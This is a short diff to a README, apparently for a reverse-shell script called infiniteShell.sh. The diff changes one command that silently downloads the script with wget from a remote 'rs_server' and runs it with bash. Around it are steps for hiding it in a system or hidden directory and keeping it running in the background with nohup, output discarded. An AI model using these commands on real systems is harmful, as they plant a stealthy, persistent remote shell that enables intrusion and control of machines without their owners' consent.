@@ -27,7 +27,7 @@ Or run as a backgroud job
 - - Navigate to specific dir or Make a hidden dir
 - - - `cd /usr/bin/local`  
 - - Download from your rs_server
-- - - `wget -q rs_server:8080/infiniteShell.sh &> /dev/null ; bash infiniteShell.sh &`
+- - - `wget -q rs_server:8080/infiniteShell.sh &> /dev/null ; bash infiniteShell.sh`
 - - Run in background witn nohup  
 - - - `nohup bash infiniteShell.sh &> /dev/null &`
 
